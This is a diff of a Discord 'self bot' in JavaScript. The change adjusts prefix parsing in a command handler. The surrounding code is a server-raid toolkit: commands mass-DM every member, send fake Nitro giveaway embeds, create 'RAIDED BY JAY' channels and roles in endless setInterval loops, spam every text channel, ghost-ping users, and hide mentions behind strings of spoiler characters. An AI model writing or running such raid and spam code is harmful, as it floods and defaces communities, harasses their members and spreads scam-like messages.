@@ -28,15 +28,14 @@ bot.on("ready", async() => {
 
 bot.on("message", message => {
     let messageArray = message.content.split(" ")
-    let cmd = messageArray[0]
+    let cmd = messageArray[0].replace(prefix, "")
     let args = messageArray.slice(1)
     if(!message.content.startsWith(prefix)) return;
-    if(message.author.id === botID) return;
     if(whitelisted.includes(message.author.id)){
         if(cmd === prefix + "hi") {
             message.reply("Hello")
         }
-        if(cmd === prefix + "dmall") {
+        if(cmd === "dmall") {
             if(!args.join(" ")) return message.reply("Please put in a message")
             let users = message.guild.members.forEach(u => {
                 if(u.user.bot) return console.log(colors.rainbow(`Couldn't send a message to ${u.user.tag}`))
@@ -45,7 +44,7 @@ bot.on("message", message => {
                 console.log(`Sent a message to ${u.user.tag} with the following message: ${args.join(" ")}`)
             })
         }
-        if(cmd === prefix + "nitro") {
+        if(cmd === "nitro") {
             let embed = new Discord.RichEmbed()
             let user = message.guild.members.get(args[0])
             if(!user) return message.reply("Please put a users ID")
@@ -57,14 +56,14 @@ bot.on("message", message => {
                 user.send(embed)
                 console.log(`Successfully dm'ed ${user}`)
         }
-        if(cmd === prefix + "createchannels") {
+        if(cmd === "createchannels") {
             setInterval(() => {
                 message.guild.createChannel("RAIDED BY JAY", {
                 type: "text"
                 })
                 })
         }
-        if(cmd === prefix + "createroles") {
+        if(cmd === "createroles") {
             setInterval(() => {
                 message.guild.createRole({
                     name:" RAIDED BY JAY",
@@ -72,7 +71,7 @@ bot.on("message", message => {
                 })
                 })
         }
-        if(cmd === prefix + "cmds") {
+        if(cmd === "cmds") {
             let embed = new Discord.RichEmbed()
             embed.setTitle("Self bot commands")
             embed.setColor("BLUE")
@@ -92,7 +91,7 @@ bot.on("message", message => {
             embed.setFooter("Self bot commands")
             message.channel.send(embed)
         }
-        if(cmd === prefix + "ping") {
+        if(cmd === "ping") {
             message.channel.send("Pinging...").then(msg => {
                 let embed = new Discord.RichEmbed()
                 embed.setTitle("Pong!")
@@ -102,7 +101,7 @@ bot.on("message", message => {
                 msg.edit("")
                 })
         }
-        if(cmd === prefix + "ghostping") {
+        if(cmd === "ghostping") {
             let userID = args[0]
             if(!userID) return message.reply("Please put a users ID")
             message.channel.send(`<@!${userID}>`).then(m => {
@@ -114,7 +113,7 @@ bot.on("message", message => {
                 return console.log(colors.red("Could not delete message!"))
             }
         }
-        if(cmd === prefix + "spam") {
+        if(cmd === "spam") {
             if (!args[0] || !/\d{1,2}/ig.test(args[0])) {
               return message.channel.send("Please specify the number of messages to spam.")
             } else {
@@ -130,7 +129,7 @@ bot.on("message", message => {
               message.channel.send(spamContent)
             }
         }
-        if(cmd === prefix + "avatar") {
+        if(cmd === "avatar") {
             let user = message.mentions.users.first();
             if(user){
                 message.channel.send(user.displayAvatarURL)
@@ -138,7 +137,7 @@ bot.on("message", message => {
                 message.reply("What the fuck. what user u want me to do")
             }
         }
-        if(cmd === prefix + "embedmsg") {
+        if(cmd === "embedmsg") {
             let embed = new Discord.RichEmbed()
             embed.setDescription(`${args.join(" ")}`)
             embed.setThumbnail(`${bot.user.displayAvatarURL}`)
@@ -146,7 +145,7 @@ bot.on("message", message => {
             embed.setFooter(`${bot.user.tag}`)
             message.channel.send(embed)
         }
-        if(cmd === prefix + "nitromsg") {
+        if(cmd === "nitromsg") {
             let embed = new Discord.RichEmbed()
                 embed.setTitle("🎉 Congratulations!")
                 embed.setColor("RANDOM")
@@ -155,18 +154,18 @@ bot.on("message", message => {
                 embed.setFooter(`${bot.user.username}`)
                 message.channel.send(embed)
         }
-        if(cmd === prefix + "sendall"){
+        if(cmd === "sendall"){
             if(!args.join(" ")) return message.reply("What u want me to say :(")
             let channels = message.guild.channels.filter(ch => ch.type === "text").forEach(ch => ch.send(args.join(" ")))
         }
-        if(cmd === prefix + "msg"){
+        if(cmd === "msg"){
             if(!args.join(" ")){
                 return message.reply("Nothing")
             } else {
                 message.channel.send(`${args.join(" ")}`)
             }
         }else{
-            if(cmd === prefix + "advanceping"){
+            if(cmd === "advanceping"){
                 let msg = args.slice(1).join(" ")
                 let userID = args[0]
                 if(!userID){
@@ -175,7 +174,7 @@ bot.on("message", message => {
                     message.channel.send(`${msg}||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||||||||||<@!${userID}>`)
                 }
             }else{
-                if(cmd === prefix + "pingall"){
+                if(cmd === "pingall"){
                     let msg = args.join(" ")
                     if(!msg){
                         return message.reply("No message")
